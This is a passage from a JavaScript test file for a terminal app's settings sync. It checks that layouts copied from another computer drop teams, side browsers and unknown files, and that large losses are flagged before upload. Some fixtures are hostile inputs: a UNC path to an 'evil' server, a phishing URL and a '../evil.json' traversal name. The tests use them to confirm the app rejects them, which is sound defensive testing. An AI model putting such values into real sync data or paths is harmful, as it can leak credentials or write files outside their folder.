    expect(out).toMatchObject({ broadcast: true, teams: [{ id: 't' }], sideBrowsers: [{ id: 's' }], sidebarWidth: 300, selectedShell: 'pwsh', settings: { agentPermissions: 'yolo', theme: 'dark' } })
    expect(out.currentIndex).toBe(0)
  })

  it('a damaged file here only means nothing comes back from it', () => {
    expect(JSON.parse(finishLayout(stage(asleep), '{ nope')).settings).toEqual({ theme: 'dark' })
  })

  it('M1: a copy with teams, broadcast and side browsers brings none of them', () => {
    const sent = rebuildLayout({ version: 2, settings: {}, broadcast: true, teams: [{ channelDir: '\\\\evil\\s' }], sideBrowsers: [{ url: 'https://phish.example/' }], sidePanelTab: 'x', workspaces: [] }, strict)
    expect(Object.keys(sent).sort()).toEqual(['settings', 'version', 'workspaces'])
  })
})

describe('H4: what fits this computer stays out of what it sends', () => {
  const agents = new Map([['claude', { command: 'claude', name: 'Claude Code', available: true }]])
  const copy = () => rebuildLayout({ version: 2, settings: {}, workspaces: [
    { id: 'ws-1', cwd: '\\\\server\\share\\p', group: { repos: [{ path: '\\\\server\\share\\p\\a' }] }, tree: { type: 'split', dir: 'row', sizes: [50, 50], children: [agent({ worktree: { path: 'D:/gone/x', branch: 'x' } }), agent({ id: 'pane-z', agentId: 'not-here' })] } }
  ] }, strict)

  it('sent back, it is the copy it received, not what it made of it', () => {
    const received = copy()
    const { layout: here, shadow } = localizeRebuilt(received, { agents, folderExists: () => false, now: () => 1 })
    expect(panes(here).map((p) => p.kind)).toEqual(['shell', 'shell'])
    // What the window writes back of that: plain terminals, in a project with no folder.
    const written = { version: 2, workspaces: [{ id: 'ws-1', cwd: null, tree: { type: 'split', dir: 'row', sizes: [50, 50], children: panes(here).map((p) => ({ type: 'leaf', id: p.id, kind: 'shell', agentId: null, agentCommand: null, sessionId: null, worktree: null, startDir: 'C:/Users/me' })) } }] }
    const sent = restoreShadow(rebuildLayout(written), shadow)
    expect(JSON.stringify(sent)).toBe(JSON.stringify(received))
  })

  it('unless the person made something else of that pane here', () => {
    const { shadow } = localizeRebuilt(copy(), { agents, folderExists: () => false, now: () => 1 })
    const written = { version: 2, workspaces: [{ id: 'ws-1', cwd: 'C:/chosen', tree: agent({ agentId: 'codex' }) }] }
    const sent = restoreShadow(rebuildLayout(written), shadow)
    expect(sent.workspaces[0].cwd).toBe('C:/chosen')
    expect(sent.workspaces[0].tree.agentId).toBe('codex')
  })

  it('a name the person gives such a pane here is kept', () => {
    const { shadow } = localizeRebuilt(copy(), { agents, folderExists: () => false, now: () => 1 })
    const written = { version: 2, workspaces: [{ id: 'ws-1', cwd: null, tree: { type: 'leaf', id: 'pane-a', kind: 'shell', paneName: 'Renamed' } }] }
    expect(restoreShadow(rebuildLayout(written), shadow).workspaces[0].tree).toMatchObject({ kind: 'agent', agentId: 'claude', paneName: 'Renamed' })
  })
})

describe('H5: what a copy holds, and what an upload would lose', () => {
  const files = (projects, cards = 0, hosts = []) => ({
    'workspace-layout.json': JSON.stringify({ workspaces: projects.map((id) => ({ id, name: id, tree: { type: 'leaf', id: `pane-${id}`, kind: 'agent' } })) }),
    'task-board.json': JSON.stringify({ tasks: Array.from({ length: cards }, (_, i) => ({ id: `t${i}` })) }),
    'remote-hosts.json': JSON.stringify({ targets: hosts.map((id) => ({ id })) })
  })

  it('says what is in it, in numbers', () => {
    expect(summaryOf(files(['ws-a', 'ws-b'], 3, ['h']))).toEqual({ projects: 2, names: ['ws-a', 'ws-b'], panes: 2, agents: 2, hosts: 1, cards: 3 })
  })

  it('a file gone is a loss, whatever the rest', () => {
    const before = shapeOf(files(['ws-a']))
    const { 'task-board.json': gone, ...rest } = files(['ws-a']) // eslint-disable-line no-unused-vars -- what vanished
    expect(shrunkFrom(before, shapeOf(rest))).toEqual({ files: ['task-board.json'] })
  })

  it('the only project replaced by another is a loss: a default grid looks like a whole setup', () => {
    expect(shrunkFrom(shapeOf(files(['ws-real'])), shapeOf(files(['ws-new']))).projects).toEqual({ from: 1, to: 1 })
  })

  it('most projects gone is a loss; one closed out of three is not', () => {
    expect(shrunkFrom(shapeOf(files(['ws-a', 'ws-b', 'ws-c'])), shapeOf(files(['ws-a'])))).toMatchObject({ projects: { from: 3, to: 1 } })
    expect(shrunkFrom(shapeOf(files(['ws-a', 'ws-b', 'ws-c'])), shapeOf(files(['ws-a', 'ws-b'])))).toBeNull()
  })

  it('most hosts, panes or cards gone is a loss; a few are not', () => {
    expect(shrunkFrom(shapeOf(files(['ws-a'], 20)), shapeOf(files(['ws-a'], 2)))).toMatchObject({ cards: { from: 20, to: 2 } })
    expect(shrunkFrom(shapeOf(files(['ws-a'], 20)), shapeOf(files(['ws-a'], 15)))).toBeNull()
    expect(shrunkFrom(shapeOf(files(['ws-a'], 0, ['h1', 'h2', 'h3'])), shapeOf(files(['ws-a'], 0, ['h1'])))).toMatchObject({ hosts: { from: 3, to: 1 } })
    expect(shrunkFrom(shapeOf(files(['ws-a'], 0, ['h1', 'h2'])), shapeOf(files(['ws-a'], 0, ['h1'])))).toBeNull()
  })

  it('with nothing to compare with, nothing to ask', () => {
    expect(shrunkFrom(null, shapeOf(files(['ws-a'])))).toBeNull()
  })
})

describe('what main does with it', () => {
  const main = readFileSync(join(__dirname, '../index.js'), 'utf8').replace(/\r\n/g, '\n')

  it('H2: the only roots the trust module gets are the folders the person chose, in both places', () => {
    expect(main.match(/agentFolderTrust\.setRoots\(([^)]*)/g)).toEqual(['agentFolderTrust.setRoots(chosenRootsOfLayout(data', 'agentFolderTrust.setRoots(chosenRootsOfLayout(saved && saved.data'])
  })

  it('H1: the window is told whether its layout came from elsewhere, and a failure means yes', () => {
    expect(main).toContain("ipcMain.handle('layout:held'")
    expect(main).toContain('return layoutHeld(app.getPath(\'userData\'))\n  } catch {\n    return true')
    expect(main).toContain("if (fromMainWindow(event)) releaseLayoutHeld(")
  })

  it('H3: the window hears of a lasting alert, keeps it on screen, and has a word for each kind', () => {
    expect(main).toContain("onAlert: (alert) => send('tesselSync:alert', alert)")
    const preload = readFileSync(join(__dirname, '../../preload/index.js'), 'utf8').replace(/\r\n/g, '\n')
    expect(preload).toContain("ipcRenderer.on('tesselSync:alert', handler)")
    expect(preload).toContain("layoutHeld: () => ipcRenderer.invoke('layout:held')")
    const app = readFileSync(join(__dirname, '../../renderer/src/App.vue'), 'utf8').replace(/\r\n/g, '\n')
    const at = app.indexOf('const stopSyncAlert =')
    const body = app.slice(at, app.indexOf('onBeforeUnmount(() => stopAccountSignedIn', at))
    for (const kind of ['erased', 'saltChanged', 'shrunk', 'uploadsStopped']) expect(body).toContain(`${kind}: () =>`)
    expect(body).toContain('timeout: 24 * 3600 * 1000')
  })

  it('a pane\'s command comes from this computer\'s own list of agents, never from a copy', () => {
    expect(main).toContain('localAgents: async () =>')
    expect(main).toContain('await getAgents(savedCustomAgents())')
    expect(main).not.toContain('knownCommands:')
  })

  it('Low: the person signing out reaches the sync; the server ending a session does not', () => {
    expect(main).toContain('onSignedOut: () => settingsSync.signedOut()')
    const account = readFileSync(join(__dirname, '../tesselAccount.js'), 'utf8').replace(/\r\n/g, '\n')
    expect(account.slice(account.indexOf('async function signOut()'), account.indexOf('async function signOut()') + 400)).toContain('onSignedOut()')
    expect(account.slice(account.indexOf('async function authed('), account.indexOf('async function authed(') + 400)).not.toContain('onSignedOut')
  })
})

describe('what is received, as a whole', () => {
  it('a file that is not JSON, or not text, refuses the copy', () => {
    expect(() => rebuildReceived({ 'workspace-layout.json': '{ nope' })).toThrow(expect.objectContaining({ code: 'refused' }))
    expect(() => rebuildReceived({ 'remote-hosts.json': 5 })).toThrow(expect.objectContaining({ code: 'refused' }))
  })

  it('a name that is not one of the three is simply not there', () => {
    const out = rebuildReceived({ 'git-trust.json': '{"evil":true}', '../evil.json': '{}', 'task-board.json': '{"tasks":[]}' })
    expect(Object.keys(out)).toEqual(['task-board.json'])
  })
})
